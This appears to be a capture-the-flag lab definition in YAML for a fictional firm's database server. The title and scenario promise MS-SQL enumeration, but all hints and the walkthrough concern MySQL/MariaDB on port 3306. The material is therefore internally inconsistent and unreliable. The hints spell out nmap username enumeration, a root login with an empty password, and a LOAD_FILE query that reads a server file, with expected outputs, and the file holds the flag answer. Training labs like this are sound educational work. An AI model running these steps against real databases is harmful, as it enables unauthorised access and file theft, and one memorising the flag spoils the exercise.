name: MS-SQL Version and Instance Enumeration
description: Enumerate MS-SQL version and instances on FinanceCorp's database server to assess security posture.
difficulty: intermediate
category: enumeration
duration_minutes: 120
objectives:
  - enumerate ms-sql version and instances
  - Understand Windows penetration testing techniques
  - Capture the flag

scenario: |
  Your detection of FinanceCorp's MS-SQL server has confirmed its presence. James 
  Mitchell wants detailed information about the SQL Server version and instances, as 
  different versions have different security characteristics and known vulnerabilities.
  
  MS-SQL version enumeration helps identify potential security issues and 
  misconfigurations. FinanceCorp needs to understand if their database server is 
  using secure versions and configurations.
  
  Your objective: Enumerate the MS-SQL version and all instances on FinanceCorp's 
  database server. Document version information and instance details for security 
  assessment.

flag: "OCR{mssql_v3rs10n}"

hints:
  - id: 1
    unlock_after_minutes: 0
    text: |
      ## Understanding Database Version Enumeration

      **Version enumeration** goes beyond simple service detection. While
      service detection tells you *what* is running, version enumeration
      tells you *exactly which version* and provides detailed configuration
      information about the database instance.

      ### Why Version Enumeration is Critical

      Knowing the exact version of a database server allows you to:

      - **Identify known vulnerabilities** (CVEs) for that specific version
      - **Determine patch level** and whether security updates are applied
      - **Understand available features** that could be exploited
      - **Plan targeted attacks** based on version-specific weaknesses
      - **Assess compliance** with security standards

      ### What Information Can Be Extracted

      Database version enumeration can reveal:

      | Information        | Security Relevance                        |
      |--------------------|-------------------------------------------|
      | Version number     | Maps to known CVEs and exploits           |
      | Protocol version   | Determines communication capabilities     |
      | Server capabilities| Shows what features are enabled            |
      | Authentication type| Reveals how credentials are handled        |
      | Character set      | May indicate regional/configuration info  |
      | Connection ID      | Shows how many connections have been made  |

      ### Enumeration vs. Detection

      - **Detection**: "There is a MySQL service on port 3306"
      - **Enumeration**: "MySQL 5.5.5-10.6.12-MariaDB with protocol 10,
        supporting SSL, compressed protocol, and interactive client"

      This deeper information is what separates basic scanning from
      thorough security assessment.

  - id: 2
    unlock_after_minutes: 5
    text: |
      ## Nmap NSE Scripts for Database Enumeration

      **Nmap Scripting Engine (NSE)** provides specialized scripts for
      deep enumeration of database services. These scripts go far beyond
      basic version detection.

      ### What is NSE?

      NSE is a powerful framework built into nmap that allows running
      Lua scripts against discovered services. Scripts are organized
      into categories:

      | Category   | Description                              |
      |------------|------------------------------------------|
      | `auth`     | Authentication-related scripts           |
      | `default`  | Scripts run with `-sC`                   |
      | `discovery`| Active service discovery                 |
      | `safe`     | Scripts that won't crash services        |
      | `vuln`     | Vulnerability detection scripts          |

      ### Using NSE Scripts

      ```bash
      # Run a specific script
      nmap --script <script-name> -p <port> <target>

      # Run multiple scripts
      nmap --script <script1>,<script2> -p <port> <target>

      # Run all scripts in a category
      nmap --script <category> -p <port> <target>

      # Run default scripts (same as -sC)
      nmap --script default -p <port> <target>
      ```

      ### Key MySQL Enumeration Scripts

      Nmap includes several scripts specifically for MySQL:

      - `mysql-info` - Retrieves version, protocol, and server info
      - `mysql-enum` - Enumerates valid MySQL usernames
      - `mysql-databases` - Lists databases (requires credentials)
      - `mysql-variables` - Shows server variables (requires credentials)
      - `mysql-audit` - Performs security audit checks

      For this lab, focus on the scripts that do **not** require
      authentication: `mysql-info` and `mysql-enum`.

  - id: 3
    unlock_after_minutes: 10
    text: |
      ## Deep Dive into MySQL Enumeration Scripts

      ### The mysql-info Script

      The `mysql-info` script connects to the MySQL service and extracts
      the server greeting packet, which contains:

      ```bash
      nmap --script mysql-info -p 3306 <target>
      ```

      **Information extracted:**
      - Protocol version (usually 10 for modern MySQL)
      - Server version string (e.g., "5.5.5-10.6.12-MariaDB")
      - Thread/connection ID
      - Server capabilities (SSL, compression, etc.)
      - Authentication salt (used in password hashing)
      - Server status flags

      ### The mysql-enum Script

      The `mysql-enum` script attempts to enumerate valid usernames by
      analyzing different error responses:

      ```bash
      nmap --script mysql-enum -p 3306 <target>
      ```

      This script exploits a behavior where MySQL returns different
      error messages for valid vs. invalid usernames, allowing you to
      discover accounts without knowing passwords.

      ### Combining Scripts for Maximum Information

      You can run multiple scripts together:

      ```bash
      nmap --script mysql-info,mysql-enum -p 3306 <target>
      ```

      Or combine with version detection for comprehensive results:

      ```bash
      nmap -sV --script mysql-info,mysql-enum -p 3306 <target>
      ```

      ### Understanding Version Strings

      MySQL version strings follow this format:
      ```
      Major.Minor.Patch-Distribution
      ```

      For example: `5.5.5-10.6.12-MariaDB`
      - `5.5.5` - MySQL compatibility version
      - `10.6.12` - Actual MariaDB version
      - `MariaDB` - Distribution identifier

      This version information is critical for vulnerability research
      and planning subsequent attack phases.

  - id: 4
    unlock_after_minutes: 15
    text: |
      ## Step-by-Step Workflow for Version Enumeration

      ### Step 1: Confirm the Service is Running

      Before deep enumeration, verify the port is open:

      ```bash
      nmap -p 3306 <target>
      ```

      Confirm you see `3306/tcp open` in the output.

      ### Step 2: Basic Version Detection

      Run service version detection first:

      ```bash
      nmap -sV -p 3306 <target>
      ```

      This gives you the initial version string from nmap's built-in
      probe matching.

      ### Step 3: Run mysql-info Script

      Extract detailed server information:

      ```bash
      nmap --script mysql-info -p 3306 <target>
      ```

      Document the protocol version, capabilities, and status flags.

      ### Step 4: Run mysql-enum Script

      Attempt to enumerate valid usernames:

      ```bash
      nmap --script mysql-enum -p 3306 <target>
      ```

      Note any usernames discovered for use in later labs.

      ### Step 5: Combined Comprehensive Scan

      Run everything together for a complete picture:

      ```bash
      nmap -sV --script mysql-info,mysql-enum -p 3306 <target>
      ```

      ### Step 6: Retrieve the Flag

      After successful enumeration, you need to retrieve the flag from
      `/tmp/flag.txt` on the target. Consider connecting to the database
      service directly:

      ```bash
      # Install MySQL client if needed
      sudo apt install -y default-mysql-client

      # Try connecting and reading the flag
      mysql --ssl-verify-server-cert=0 -u root -h <target> -e "SELECT LOAD_FILE('/tmp/flag.txt');"
      ```

      ### Step 7: Document Everything

      Record all findings including version numbers, usernames discovered,
      and server capabilities for your assessment report.

  - id: 5
    unlock_after_minutes: 20
    text: |
      ## Exact Commands for This Lab

      Run these commands in sequence against your target:

      ### Command 1: Version Detection

      ```bash
      nmap -sV -p 3306 <target>
      ```

      ### Command 2: MySQL Info Script

      ```bash
      nmap --script mysql-info -p 3306 <target>
      ```

      ### Command 3: MySQL Enumeration Script

      ```bash
      nmap --script mysql-enum -p 3306 <target>
      ```

      ### Command 4: Combined Scan (All-in-One)

      ```bash
      nmap -sV -sC --script mysql-info,mysql-enum -p 3306 <target>
      ```

      ### Command 5: Install MySQL Client

      If the MySQL client is not already installed:

      ```bash
      sudo apt install -y default-mysql-client
      ```

      ### Command 6: Retrieve the Flag

      Connect to the database and read the flag file:

      ```bash
      mysql --ssl-verify-server-cert=0 -u root -h <target> -e "SELECT LOAD_FILE('/tmp/flag.txt');"
      ```

      If root without a password does not work, try:

      ```bash
      mysql --ssl-verify-server-cert=0 -u root --password="" -h <target> -e "SELECT LOAD_FILE('/tmp/flag.txt');"
      ```

      Replace `<target>` with the actual IP address of the database
      server in your lab environment throughout all commands.

  - id: 6
    unlock_after_minutes: 25
    text: |
      ## Complete Solution Walkthrough

      ### Step 1: Version Detection Scan

      ```bash
      nmap -sV -p 3306 <target>
      ```

      **Expected Output:**
      ```
      Starting Nmap 7.94 ( https://nmap.org )
      Nmap scan report for <target>
      Host is up (0.001s latency).

      PORT     STATE SERVICE VERSION
      3306/tcp open  mysql   MySQL 5.5.5-10.x.x-MariaDB

      Nmap done: 1 IP address (1 host up) scanned in 1.50 seconds
      ```

      ### Step 2: MySQL Info Enumeration

      ```bash
      nmap --script mysql-info -p 3306 <target>
      ```

      **Expected Output:**
      ```
      PORT     STATE SERVICE
      3306/tcp open  mysql
      | mysql-info:
      |   Protocol: 10
      |   Version: 5.5.5-10.x.x-MariaDB
      |   Thread ID: 5
      |   Capabilities flags: 63486
      |   Some Coverage flags: ...
      |   Status: Autocommit
      |_  Salt: <random_salt_value>
      ```

      ### Step 3: Username Enumeration

      ```bash
      nmap --script mysql-enum -p 3306 <target>
      ```

      **Expected Output:**
      ```
      PORT     STATE SERVICE
      3306/tcp open  mysql
      | mysql-enum:
      |   Valid usernames:
      |     root:<empty> - Valid credentials
      |_  Statistics: ...
      ```

      ### Step 4: Retrieve the Flag

      ```bash
      mysql --ssl-verify-server-cert=0 -u root -h <target> -e "SELECT LOAD_FILE('/tmp/flag.txt');"
      ```

      **Expected Output:**
      ```
      +---------------------------------------------------+
      | LOAD_FILE('/tmp/flag.txt')                         |
      +---------------------------------------------------+
      | OCR{...}                                         |
      +---------------------------------------------------+
      ```

      ### Key Takeaways

      - Nmap NSE scripts provide deep enumeration capabilities
      - `mysql-info` reveals protocol version, capabilities, and status
      - `mysql-enum` can discover valid usernames without authentication
      - Version strings are critical for vulnerability research
      - MariaDB uses a MySQL-compatible protocol on the same port
      - Always combine `-sV` with relevant NSE scripts for best results

      Submit the flag value to complete this lab.

